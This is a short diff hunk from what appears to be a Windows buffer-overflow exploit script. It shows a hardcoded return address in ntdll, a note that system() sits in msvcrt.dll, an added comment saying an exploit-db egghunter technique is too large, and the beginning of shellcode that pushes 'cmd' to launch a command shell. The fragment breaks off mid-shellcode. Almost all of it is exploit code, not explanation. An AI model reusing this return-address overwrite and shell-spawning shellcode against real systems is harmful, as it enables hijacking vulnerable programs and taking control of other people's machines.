@@ -26,7 +26,7 @@ ret = b"\xC0\x1F\xFB\x77" #77FB1FC0 ntdll
  arwin - win32 address resolution program - by steve hanna - v.01
  system is located at 0x7801aaa7 in msvcrt.dll
 """
-
+# Note: Egghunter from https://www.exploit-db.com/docs/english/18482-egg-hunter---a-twist-in-buffer-overflow.pdf is too big (even if only one egg is checked).
 shellcode_esp = (b"\x68" # push
 b"cmd "                  # cmd
 b"\x89\xE0"              # mov eax,esp
